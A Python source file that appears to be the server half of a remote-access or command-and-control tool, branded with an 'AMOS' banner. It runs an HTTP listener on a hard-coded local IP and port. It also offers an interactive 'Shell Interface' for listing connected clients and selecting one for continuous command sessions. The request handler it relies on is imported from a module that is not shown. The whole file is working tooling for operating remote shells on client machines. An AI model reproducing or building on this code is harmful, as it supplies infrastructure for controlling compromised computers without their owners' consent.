from http.server import BaseHTTPRequestHandler, HTTPServer
from HttpHandler import MyHandler
from urllib.parse import parse_qs
import threading


art = """

█████╗ ███╗   ███╗ ██████╗ ███████╗
██╔══██╗████╗ ████║██╔═══██╗██╔════╝
███████║██╔████╔██║██║   ██║███████╗
██╔══██║██║╚██╔╝██║██║   ██║╚════██║
██║  ██║██║ ╚═╝ ██║╚██████╔╝███████║
╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚══════╝

"""



print(art)



class MyServer:


    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.server = HTTPServer((self.ip, self.port), MyHandler)



    def shell_interface(self, http_server):
        print(f'[*] Server started on {self.ip}:{self.port}')

        while True:
            print("Type 'clients' to list connected clients or 'select <client_ip>' to choose a client.")
            cmd = input("Shell Interface: ")
            cmd = cmd.strip().lower()

            if cmd == 'clients':
                for client_ip, client_id in http_server.RequestHandlerClass.connected_clients.items():
                    print(f"{client_id}: {client_ip}")
            elif cmd.startswith('select '):
                client_ip = cmd.split(' ')[1]
                if client_ip in http_server.RequestHandlerClass.connected_clients:
                    http_server.RequestHandlerClass.selected_client_ip = client_ip
                    print(f"Selected client: {client_ip}")
                    http_server.RequestHandlerClass.continuous_communication(http_server.RequestHandlerClass, client_ip)
                    http_server.RequestHandlerClass.selected_client_ip = None
                else:
                    print("[-] Invalid client IP!!!")
            else:
                print("[-] Invalid command!!!")



    def start(self):

        # Start the HTTP server in a separate thread
        server_thread = threading.Thread(target=self.server.serve_forever)
        server_thread.daemon = True
        server_thread.start()

        self.shell_interface(self.server)



if __name__ == '__main__':
    server = MyServer('192.168.1.192', 8080)
    server.start()
   

    
    